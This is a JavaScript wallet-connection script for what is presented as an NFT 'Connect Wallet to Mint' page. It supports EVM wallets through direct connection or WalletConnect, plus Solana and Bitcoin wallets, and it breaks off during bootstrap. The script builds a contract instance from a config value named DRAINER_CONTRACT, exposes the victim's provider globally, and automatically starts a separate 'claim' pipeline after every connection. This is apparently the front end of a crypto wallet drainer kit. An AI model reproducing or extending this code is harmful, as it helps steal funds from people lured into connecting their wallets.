import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ─── CONFIG BINDINGS ────────────────────────────────────────
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI
  } = CONFIG;

  // ─── GLOBAL STATE ───────────────────────────────────────────
  const state = {
    client: null,           // SignClient singleton
    modal: null,            // WalletConnectModal singleton
    SignClient: null,
    WalletConnectModal: null,
    EthereumProvider: null,
    currentSession: null,
    web3: null,
    contract: null,
    isConnecting: false,    // idempotency guard
    projectId: PROJECT_ID,  // may switch to test ID on retry
    librariesLoaded: false,
    libsLoadPromise: null,
    visibilityBound: false
  };

  // ─── DEBUG PANEL (double-tap) ───────────────────────────────
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const line = `[${new Date().toLocaleTimeString()}] ${msg}`;
    console.log(line);
    debugArea.innerHTML += `<div>${line}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ─── DEVICE DETECTION ───────────────────────────────────────
  const UA = navigator.userAgent;
  const isMobile  = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOS     = () => /iPhone|iPad|iPod/i.test(UA);
  const isAndroid = () => /Android/i.test(UA);
  const isDesktop = () => !isMobile();
  const isWindows = () => /Windows/i.test(UA);
  const isMac     = () => /Macintosh|Mac OS X/i.test(UA);
  const getPlatform = () => isIOS() ? 'ios' : isAndroid() ? 'android' : isWindows() ? 'windows' : isMac() ? 'mac' : 'unknown';

  // ─── WEBSOCKET PRE-WARM (non-blocking, fire-and-forget) ─────
  function prewarmRelay() {
    try {
      const ws = new WebSocket('wss://relay.walletconnect.com');
      const t = setTimeout(() => { try { ws.close(); } catch (_) {} }, 3000);
      ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch (_) {} logDebug('WS pre-warm ok'); };
      ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch (_) {} };
    } catch (_) { /* ignore */ }
  }

  // ─── PARALLEL LIBRARY LOADING (CDN racing) ──────────────────
  //
  // Each library is fetched from multiple CDNs *in parallel*.
  // The first successful `import()` resolves the promise; the rest
  // are left to settle as no-ops. This cuts cold-start from
  // sequential (~3-6 s) to a single network round-trip.
  //
  // ─────────────────────────────────────────────────────────────
  const SIGN_CLIENT_CDNS = [
    'https://esm.sh/@walletconnect/sign-client@2.11.0',
    'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
    'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
    'https://unpkg.com/@walletconnect/sign-client@2.11.0/dist/index.es.js'
  ];
  const MODAL_CDNS = [
    'https://esm.sh/@walletconnect/modal@2.6.2',
    'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
    'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
    'https://unpkg.com/@walletconnect/modal@2.6.2/dist/index.es.js'
  ];
  const PROVIDER_CDNS = [
    'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
    'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
    'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0'
  ];

  async function raceImport(cdns, extractor) {
    return await new Promise((resolve) => {
      let settled = false;
      let pending = cdns.length;
      cdns.forEach((url) => {
        import(url).then((mod) => {
          const value = extractor(mod);
          if (settled || !value) return;
          settled = true;
          logDebug(`✅ Loaded from ${url}`);
          resolve(value);
        }).catch(() => {
          pending--;
          if (pending === 0 && !settled) {
            logDebug(`❌ All CDNs failed for ${cdns[0]}`);
            resolve(null);
          }
        });
      });
    });
  }

  async function loadWalletConnectLibraries() {
    if (state.librariesLoaded) return true;
    if (state.libsLoadPromise) return state.libsLoadPromise;

    state.libsLoadPromise = (async () => {
      logDebug('Loading WalletConnect libraries (parallel)...');
      prewarmRelay();

      // First, honour any globals already present (AppKit / prior load)
      if (window.WalletConnectSignClient) {
        state.SignClient = window.WalletConnectSignClient;
        logDebug('Using window.WalletConnectSignClient');
      }
      if (window.WalletConnectModal) {
        state.WalletConnectModal = window.WalletConnectModal;
        logDebug('Using window.WalletConnectModal');
      }

      // Fetch all three in parallel
      const [sc, wm, ep] = await Promise.all([
        state.SignClient ? Promise.resolve(state.SignClient)
          : raceImport(SIGN_CLIENT_CDNS, (m) => m?.default || m?.SignClient || m),
        state.WalletConnectModal ? Promise.resolve(state.WalletConnectModal)
          : raceImport(MODAL_CDNS, (m) => m?.WalletConnectModal || m?.default || m),
        state.EthereumProvider ? Promise.resolve(state.EthereumProvider)
          : raceImport(PROVIDER_CDNS, (m) => m?.EthereumProvider || m?.default || m)
      ]);

      if (!sc) throw new Error('SignClient unavailable from all CDNs');
      if (!wm) throw new Error('WalletConnectModal unavailable from all CDNs');

      state.SignClient         = sc;
      state.WalletConnectModal = wm;
      state.EthereumProvider   = ep; // optional, may be null
      state.librariesLoaded    = true;

      logDebug('✅ All WalletConnect libraries ready');
      return true;
    })();

    return state.libsLoadPromise;
  }

  // ─── DOM REFERENCES ─────────────────────────────────────────
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ─── UI HELPERS ─────────────────────────────────────────────
  function setButtonState(button, stateKey) {
    if (!button) return;
    button.style.display = 'inline-block';
    button.style.padding = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight = '600';
    button.style.border = 'none';
    button.style.cursor = stateKey === 'loading' ? 'not-allowed' : 'pointer';
    button.style.transition = 'all 0.3s ease';
    button.style.color = 'white';
    button.style.fontSize = '16px';
    button.style.fontFamily = "'Inter', sans-serif";
    button.style.boxShadow = '0 4px 12px rgba(0,0,0,0.15)';
    button.style.minWidth = '180px';
    button.disabled = stateKey === 'loading';

    const themes = {
      loading:    { bg: 'linear-gradient(135deg,#666,#888)',  icon: 'spinner fa-spin',         text: 'Connecting...' },
      connected:  { bg: 'linear-gradient(135deg,#10B981,#059669)', icon: 'check-circle',        text: 'Connected' },
      disconnect: { bg: 'linear-gradient(135deg,#EF4444,#DC2626)', icon: 'power-off',           text: 'Disconnect' },
      failed:     { bg: 'linear-gradient(135deg,#EF4444,#DC2626)', icon: 'exclamation-triangle',text: 'Failed' },
      normal:     { bg: 'linear-gradient(135deg,#FF6B00,#FF8C00)', icon: 'wallet',              text: 'Connect Wallet to Mint' }
    };
    const t = themes[stateKey] || themes.normal;
    button.style.background = t.bg;
    button.innerHTML = `<i class="fas fa-${t.icon}" style="margin-right:8px"></i> ${t.text}`;

    if (stateKey === 'failed') setTimeout(() => setButtonState(button, 'normal'), 3000);
  }

  function showStatus(message, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = message;
    claimStatus.className = `status ${type}`;
    Object.assign(claimStatus.style, {
      display: 'block', padding: '12px 16px', borderRadius: '8px',
      marginTop: '12px', fontWeight: '500', fontSize: '14px',
      textAlign: 'center', transition: 'all 0.3s ease'
    });
    const styles = {
      success: { background: 'linear-gradient(135deg,#DCFCE7,#BBF7D0)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg,#FEE2E2,#FECACA)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg,#DBEAFE,#BFDBFE)', color: '#1E40AF', border: '1px solid #93C5FD' }
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => {
        claimStatus.style.opacity = '0';
        setTimeout(() => { claimStatus.style.display = 'none'; claimStatus.style.opacity = '1'; }, 300);
      }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ─── STORAGE ────────────────────────────────────────────────
  const Storage = {
    save(address, session, chainType) {
      try {
        localStorage.setItem('connectedWallet', address);
        if (session)   localStorage.setItem('walletConnectSession', JSON.stringify(session));
        if (chainType) localStorage.setItem('chainType', chainType);
      } catch (_) {}
    },
    wallet()   { return localStorage.getItem('connectedWallet'); },
    session()  {
      try { const s = localStorage.getItem('walletConnectSession'); return s ? JSON.parse(s) : null; }
      catch (_) { return null; }
    },
    chain()    { return localStorage.getItem('chainType') || 'unknown'; },
    clear()    {
      localStorage.removeItem('connectedWallet');
      localStorage.removeItem('walletConnectSession');
      localStorage.removeItem('chainType');
    }
  };

  function detectChainType() {
    if (window.unisat) return 'bitcoin';
    if (window.solana && typeof window.solana.connect === 'function') return 'solana';
    if (window.ethereum) return 'evm';
    return 'unknown';
  }

  // ─── PUBLISH TO GLOBAL (consumed by Script.js) ──────────────
  function publishGlobal(address, chain, provider, session) {
    // Lazy-load Web3 for the global contract instance
    let web3Instance = null;
    let contractInstance = null;
    try {
      if (typeof Web3 !== 'undefined' && provider) {
        web3Instance = new Web3(provider);
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      }
    } catch (e) { logDebug('Web3 init in publishGlobal: ' + e.message); }

    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider,
      session,
      publishedAt: Date.now()
    };
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: window.__apexConnected }));
    state.web3     = web3Instance;
    state.contract = contractInstance;
    logDebug(`Published __apexConnected (${chain}: ${address})`);
  }

  // ─── CONNECTED UI ───────────────────────────────────────────
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel  = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg,#ECFDF5,#D1FAE5);
        border-radius: 8px; border: 1px solid #A7F3D0;
        box-shadow: 0 2px 8px rgba(5,150,105,0.1);
      `;
      connectButton.parentNode.appendChild(display);
    }
    const short = `${address.slice(0,6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;" title="Copy address">
          <i class="far fa-copy"></i>
        </button>
      </div>`;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const btn = document.getElementById('copyAddress');
        const orig = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { btn.innerHTML = orig; }, 2000);
      });
    });
    showStatus(`Connected to ${chainLabel}`, 'success');
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    state.web3 = null;
    state.contract = null;
    window.__apexConnected = null;
  }

  // ─── SOLANA WALLETS ─────────────────────────────────────────
  function getSolanaWallets() {
    const out = [];
    if (window.phantom?.solana || window.solana?.isPhantom)
      out.push({ name: 'Phantom', provider: window.phantom?.solana || window.solana });
    if (window.solflare)      out.push({ name: 'Solflare', provider: window.solflare });
    if (window.backpack)      out.push({ name: 'Backpack', provider: window.backpack });
    if (window.coinbaseSolana) out.push({ name: 'Coinbase', provider: window.coinbaseSolana });
    if (window.trustWallet?.solana) out.push({ name: 'Trust', provider: window.trustWallet.solana });
    return out;
  }

  // ─── EIP-6963 PROVIDER DISCOVERY ────────────────────────────
  const evmProviders = [];
  let eip6963Bound = false;

  function setupEIP6963() {
    if (eip6963Bound) return;
    eip6963Bound = true;
    window.addEventListener('eip6963:announceProvider', (ev) => {
      const d = ev.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name} (${d.info.rdns})`);
      }
    });
    // Ask multiple times because some wallets announce late
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 300);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1200);
  }

  // ─── WALLET SELECTION MODAL (multiple EVM providers) ────────
  function showWalletSelectionModal(providers) {
    return new Promise((resolve) => {
      const overlay = document.createElement('div');
      overlay.style.cssText = `
        position: fixed; inset: 0; background: rgba(0,0,0,0.7);
        display:flex; align-items:center; justify-content:center; z-index:99999;
      `;
      const modal = document.createElement('div');
      modal.style.cssText = `
        background:#1F2937; padding:24px; border-radius:16px;
        max-width:400px; width:90%; color:white;
        font-family:'Inter',sans-serif; box-shadow:0 20px 60px rgba(0,0,0,0.5);
      `;
      modal.innerHTML = `
        <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
        <div id="walletList" style="display:flex;flex-direction:column;gap:10px;margin:16px 0;"></div>
        <button id="cancelWalletSelect" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%;">Cancel</button>
      `;
      overlay.appendChild(modal);
      document.body.appendChild(overlay);

      const list = modal.querySelector('#walletList');
      providers.forEach((p) => {
        const btn = document.createElement('button');
        btn.textContent = p.info.name;
        btn.style.cssText = `
          background:#374151;border:none;padding:12px 16px;border-radius:8px;
          color:white;font-size:16px;cursor:pointer;text-align:left;
          display:flex;align-items:center;gap:10px;
        `;
        if (p.info.icon) {
          const img = document.createElement('img');
          img.src = p.info.icon; img.style.width = '24px'; img.style.height = '24px';
          btn.prepend(img);
        }
        btn.onclick = () => { overlay.remove(); resolve(p); };
        list.appendChild(btn);
      });
      modal.querySelector('#cancelWalletSelect').onclick = () => { overlay.remove(); resolve(null); };
    });
  }

  // ─── WALLETCONNECT INIT (SINGLETON) ─────────────────────────
  async function initWalletConnect(useTestId = false) {
    if (state.client && state.modal) return true;

    if (useTestId && state.projectId !== PUBLIC_TEST_ID) {
      logDebug('Falling back to public test projectId');
      state.projectId = PUBLIC_TEST_ID;
    }

    await loadWalletConnectLibraries();

    try {
      state.client = await state.SignClient.init({
        projectId: state.projectId,
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com'
      });

      state.modal = new state.WalletConnectModal({
        projectId: state.projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
          '--wcm-font-family': "'Inter', sans-serif"
        },
        enableExplorer: true,
        explorerRecommendedWalletIds: [
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
          'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa',
          'ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18'
        ],
        mobileWallets: DAPP_METADATA.mobileWallets || [
          { id: 'metamask', name: 'MetaMask',        links: { native: 'metamask://',       universal: 'https://metamask.app.link/' } },
          { id: 'trust',    name: 'Trust Wallet',    links: { native: 'trust://',          universal: 'https://link.trustwallet.com/' } },
          { id: 'rainbow',  name: 'Rainbow',         links: { native: 'rainbow://',        universal: 'https://rnbwapp.com/' } },
          { id: 'coinbase', name: 'Coinbase Wallet', links: { native: 'coinbasewallet://', universal: 'https://go.cb-w.com/' } }
        ]
      });
      logDebug('✅ WalletConnect client + modal initialised');
      return true;
    } catch (err) {
      logDebug('❌ initWalletConnect: ' + err.message);
      return false;
    }
  }

  // ─── DIRECT EVM (DESKTOP FIRST) ─────────────────────────────
  async function connectDirectEVM(timeoutMs = 4000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 300)); // give announced providers a beat

    let providers = evmProviders.filter((p) => p.provider);
    if (!providers.length && window.ethereum) {
      providers = [{
        info: { name: 'Injected Wallet', rdns: 'io.injected', icon: '' },
        provider: window.ethereum
      }];
    }
    if (!providers.length) { logDebug('No EVM provider found'); return false; }

    let chosen = providers.length === 1
      ? providers[0]
      : providers.find((p) => p.info.rdns === 'io.metamask' || /metamask/i.test(p.info.name))
        || await showWalletSelectionModal(providers);
    if (!chosen) return false;

    try {
      logDebug(`Direct EVM: ${chosen.info.name} (timeout ${timeoutMs}ms)`);
      const accounts = await Promise.race([
        chosen.provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), timeoutMs))
      ]);
      if (accounts?.length) {
        const address = accounts[0];
        Storage.save(address, null, 'evm');
        state.currentSession = null;
        updateConnectedUI(address, 'evm');
        setupEVMProviderEvents(chosen.provider);
        publishGlobal(address, 'evm', chosen.provider, null);
        logDebug(`✅ Direct EVM connected: ${address}`);
        return true;
      }
    } catch (err) {
      logDebug(`Direct EVM failed: ${err.message}`);
    }
    return false;
  }

  // ─── WALLETCONNECT EVM CONNECT (MOBILE-FIRST) ───────────────
  async function connectViaWalletConnect(useTestId = false, timeoutMs = 45000) {
    if (state.isConnecting) { logDebug('WC already in progress'); return false; }
    state.isConnecting = true;

    try {
      if (!await initWalletConnect(useTestId)) {
        showStatus('WalletConnect service unavailable', 'error');
        return false;
      }

      // Close any lingering modal
      try { state.modal?.closeModal?.(); } catch (_) {}

      showStatus('Opening wallet…', 'info');

      const { uri, approval } = await state.client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged']
          }
        }
      });

      if (uri) {
        logDebug(`WC URI issued (len ${uri.length})`);
        // Open modal synchronously — this is what makes mobile fast
        state.modal.openModal({ uri });
        sessionStorage.setItem('pending_wc_uri', uri);
        sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());
        showStatus('Scan QR or open your wallet', 'info');

        // Optional deep-link assist on iOS — only *after* modal is visible
        if (isIOS()) {
          const wallets = DAPP_METADATA.mobileWallets || [
            { name: 'MetaMask',        links: { universal: 'https://metamask.app.link/' } },
            { name: 'Trust Wallet',    links: { universal: 'https://link.trustwallet.com/' } },
            { name: 'Rainbow',         links: { universal: 'https://rnbwapp.com/' } },
            { name: 'Coinbase Wallet', links: { universal: 'https://go.cb-w.com/' } }
          ];
          // Don't auto-redirect; let the user pick. Just store the intent.
          sessionStorage.setItem('wc_deeplinks', JSON.stringify(wallets));
        }
      }

      const session = await Promise.race([
        approval(),
        new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), timeoutMs))
      ]);

      try { state.modal?.closeModal?.(); } catch (_) {}
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      const accounts = session?.namespaces?.eip155?.accounts;
      if (!accounts?.length) { showStatus('No accounts returned', 'error'); return false; }

      const address = accounts[0].split(':')[2];
      state.currentSession = session;
      Storage.save(address, session, 'evm');
      updateConnectedUI(address, 'evm');

      // Build a live EIP-1193 provider from the WC session
      let provider = null;
      if (state.EthereumProvider) {
        try {
          provider = await state.EthereumProvider.init({
            projectId: state.projectId,
            metadata: DAPP_METADATA,
            session
          });
        } catch (e) { logDebug('EthProvider init failed: ' + e.message); }
      }
      // Fallback: use a shim that proxies via the SignClient
      if (!provider) provider = makeWCShimProvider();

      publishGlobal(address, 'evm', provider, session);
      logDebug(`✅ WalletConnect connected: ${address}`);
      return true;
    } catch (err) {
      try { state.modal?.closeModal?.(); } catch (_) {}
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      const msg = (err?.message || '').toLowerCase();
      if (msg.includes('user rejected') || msg.includes('cancelled')) showStatus('Connection cancelled', 'error');
      else if (msg.includes('timeout')) showStatus('Connection timed out – retry', 'error');
      else showStatus('WalletConnect failed', 'error');
      logDebug('WC error: ' + err.message);
      return false;
    } finally {
      state.isConnecting = false;
    }
  }

  // Minimal EIP-1193 shim over the current WC session (fallback only)
  function makeWCShimProvider() {
    return {
      request: async ({ method, params }) => {
        if (!state.client || !state.currentSession) throw new Error('no session');
        return await state.client.request({
          topic: state.currentSession.topic,
          chainId: 'eip155:1',
          request: { method, params }
        });
      },
      on: () => {}, removeListener: () => {}, disconnect: async () => {}
    };
  }

  // ─── BITCOIN (UNISAT) — desktop only ────────────────────────
  async function connectBitcoin() {
    try {
      if (!window.unisat) { showStatus('UniSat not installed', 'error'); return false; }
      await window.unisat.requestAccounts();
      const accounts = await window.unisat.getAccounts();
      if (!accounts?.length) throw new Error('No BTC account');
      const address = accounts[0];
      Storage.save(address, null, 'bitcoin');
      updateConnectedUI(address, 'bitcoin');
      publishGlobal(address, 'bitcoin', null, null);

      window.unisat.on?.('accountsChanged', (list) => {
        if (!list.length) { resetConnectedUI(); Storage.clear(); }
        else { Storage.save(list[0], null, 'bitcoin'); updateConnectedUI(list[0], 'bitcoin'); publishGlobal(list[0], 'bitcoin', null, null); }
      });
      return true;
    } catch (e) {
      logDebug('BTC error: ' + e.message);
      showStatus('Bitcoin connect failed: ' + e.message, 'error');
      return false;
    }
  }

  // ─── SOLANA — desktop only ──────────────────────────────────
  async function connectSolana() {
    try {
      const wallets = getSolanaWallets();
      if (!wallets.length) { showStatus('No Solana wallet found', 'error'); return false; }
      const { provider } = wallets[0];

      let publicKey;
      if (provider.connect) {
        const res = await provider.connect();
        publicKey = res.publicKey?.toString() || res.toString();
      } else if (provider.request) {
        const res = await provider.request({ method: 'connect' });
        publicKey = res.publicKey?.toString?.() || res.publicKey;
      } else {
        throw new Error('Unsupported Solana provider');
      }

      Storage.save(publicKey, null, 'solana');
      updateConnectedUI(publicKey, 'solana');
      publishGlobal(publicKey, 'solana', provider, null);

      window.solanaProvider = provider;
      window.solanaPublicKey = publicKey;
      provider.on?.('accountChanged', (pk) => {
        if (pk) {
          const addr = pk.toString();
          Storage.save(addr, null, 'solana');
          updateConnectedUI(addr, 'solana');
          window.solanaPublicKey = addr;
          publishGlobal(addr, 'solana', provider, null);
        } else {
          resetConnectedUI(); Storage.clear();
          window.solanaProvider = null; window.solanaPublicKey = null;
        }
      });
      provider.on?.('disconnect', () => {
        resetConnectedUI(); Storage.clear();
        window.solanaProvider = null; window.solanaPublicKey = null;
      });
      return true;
    } catch (e) {
      logDebug('SOL error: ' + e.message);
      showStatus('Solana connect failed: ' + e.message, 'error');
      return false;
    }
  }

  // ─── EVM PROVIDER EVENTS ────────────────────────────────────
  function setupEVMProviderEvents(provider) {
    if (!provider?.on) return;
    provider.on('accountsChanged', (accounts) => {
      if (!accounts?.length) { resetConnectedUI(); Storage.clear(); }
      else {
        updateConnectedUI(accounts[0], 'evm');
        Storage.save(accounts[0], state.currentSession, 'evm');
        publishGlobal(accounts[0], 'evm', provider, state.currentSession);
        setTimeout(() => window.initiateClaimProcess?.(), 800);
      }
    });
    provider.on('chainChanged', (id) => showStatus(`Network changed: ${id}`, 'info'));
    provider.on('disconnect', () => { resetConnectedUI(); Storage.clear(); });
  }

  // ─── MAIN DISPATCHER ────────────────────────────────────────
  async function connectWallet() {
    if (state.isConnecting) { logDebug('Already connecting'); return; }
    state.isConnecting = true;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Detecting wallet…', 'info');

    const platform = getPlatform();
    logDebug(`connectWallet: ${platform} | mobile=${isMobile()}`);

    try {
      let ok = false;

      // ── MOBILE: WalletConnect first and only ──
      if (isMobile()) {
        logDebug('Mobile: WalletConnect path');
        ok = await connectViaWalletConnect(false, 45000)
          || await connectViaWalletConnect(true,  45000);
        if (!ok) {
          showStatus('No compatible wallet found', 'error');
          setButtonState(connectButton, 'failed');
          if (walletButton) setButtonState(walletButton, 'failed');
          return;
        }
      } else {
        // ── DESKTOP: direct → WC → SOL → BTC ──
        logDebug('Desktop: direct EVM (4s)');
        ok = await connectDirectEVM(4000);

        if (!ok) {
          logDebug('Desktop: WalletConnect fallback');
          ok = await connectViaWalletConnect(false, 45000)
            || await connectViaWalletConnect(true,  45000);
        }
        if (!ok && getSolanaWallets().length) {
          logDebug('Desktop: Solana path');
          ok = await connectSolana();
        }
        if (!ok && window.unisat) {
          logDebug('Desktop: Bitcoin path');
          ok = await connectBitcoin();
        }
        if (!ok) {
          showStatus('No supported wallet found', 'error');
          setButtonState(connectButton, 'failed');
          if (walletButton) setButtonState(walletButton, 'failed');
          return;
        }
      }

      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');

      // Kick off Script.js pipeline
      setTimeout(() => window.initiateClaimProcess?.(), 1200);
    } catch (err) {
      logDebug('connectWallet fatal: ' + err.message);
      showStatus('Unexpected error: ' + err.message, 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    } finally {
      state.isConnecting = false;
    }
  }

  // ─── DISCONNECT ─────────────────────────────────────────────
  async function disconnectWallet() {
    try {
      if (window.solanaProvider?.disconnect) await window.solanaProvider.disconnect();
      if (state.client && state.currentSession) {
        await state.client.disconnect({
          topic: state.currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' }
        });
      }
    } catch (e) { logDebug('disconnect: ' + e.message); }

    state.currentSession = null;
    window.solanaProvider = null;
    window.solanaPublicKey = null;
    resetConnectedUI();
    Storage.clear();
  }

  // ─── BUTTON HANDLER ─────────────────────────────────────────
  const handleClick = async () => {
    const saved = Storage.wallet();
    if (saved && (state.currentSession || Storage.chain() !== 'unknown')) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };
  connectButton?.addEventListener('click', handleClick);
  walletButton?.addEventListener('click', handleClick);

  // ─── SESSION RESTORE ────────────────────────────────────────
  async function restoreWalletConnection() {
    const savedWallet = Storage.wallet();
    const savedChain  = Storage.chain();
    const savedSess   = Storage.session();

    // Handle pending WC redirect (mobile return)
    const pendingUri = sessionStorage.getItem('pending_wc_uri');
    const pendingTs  = sessionStorage.getItem('pending_wc_timestamp');
    if (pendingUri && pendingTs && Date.now() - parseInt(pendingTs) < 120000) {
      logDebug('Detected pending WC return');
      try {
        await initWalletConnect(false);
        await new Promise((r) => setTimeout(r, 1500));
        const sessions = state.client.session.values();
        if (sessions.length) {
          const s = sessions[0];
          const addr = s.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
          if (addr) {
            state.currentSession = s;
            Storage.save(addr, s, 'evm');
            updateConnectedUI(addr, 'evm');
            const provider = state.EthereumProvider
              ? await state.EthereumProvider.init({ projectId: state.projectId, metadata: DAPP_METADATA, session: s }).catch(() => null)
              : null;
            publishGlobal(addr, 'evm', provider || makeWCShimProvider(), s);
            sessionStorage.removeItem('pending_wc_uri');
            sessionStorage.removeItem('pending_wc_timestamp');
            setTimeout(() => window.initiateClaimProcess?.(), 1000);
            return;
          }
        }
      } catch (e) { logDebug('pending restore: ' + e.message); }
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');
    }

    if (!savedWallet || savedChain === 'unknown') return;
    logDebug(`Restore attempt: ${savedChain} ${savedWallet}`);

    if (savedChain === 'evm') {
      // Try saved WC session first
      if (savedSess) {
        try {
          await initWalletConnect(false);
          const s = state.client.session.get(savedSess.topic);
          if (s) {
            state.currentSession = s;
            updateConnectedUI(savedWallet, 'evm');
            const provider = state.EthereumProvider
              ? await state.EthereumProvider.init({ projectId: state.projectId, metadata: DAPP_METADATA, session: s }).catch(() => null)
              : null;
            publishGlobal(savedWallet, 'evm', provider || makeWCShimProvider(), s);
            return;
          }
        } catch (e) { logDebug('saved session restore: ' + e.message); }
      }
      // Direct injected provider (desktop)
      if (isDesktop() && window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' }).catch(() => []);
          if (accounts?.length && accounts[0] === savedWallet) {
            updateConnectedUI(savedWallet, 'evm');
            publishGlobal(savedWallet, 'evm', window.ethereum, null);
            return;
          }
        } catch (_) {}
      }
      // Mobile with no session — try silent WC reconnect, else clear
      if (isMobile()) {
        const ok = await connectViaWalletConnect(false, 30000).catch(() => false);
        if (!ok) Storage.clear();
      }
    } else if (savedChain === 'solana') {
      if (window.solana?.publicKey?.toString() === savedWallet) {
        updateConnectedUI(savedWallet, 'solana');
        window.solanaProvider = window.solana;
        window.solanaPublicKey = savedWallet;
        publishGlobal(savedWallet, 'solana', window.solana, null);
        return;
      }
      if (isDesktop()) { if (await connectSolana()) return; }
      Storage.clear();
    } else if (savedChain === 'bitcoin') {
      if (isDesktop() && window.unisat) {
        try {
          const accounts = await window.unisat.getAccounts();
          if (accounts?.[0] === savedWallet) {
            updateConnectedUI(savedWallet, 'bitcoin');
            publishGlobal(savedWallet, 'bitcoin', null, null);
            return;
          }
        } catch (_) {}
      }
      Storage.clear();
    }
  }

  // ─── BOOTSTRAP ──────────────────────────────────────────────
  try {
    // Pre-warm libraries while we wait for DOM readiness
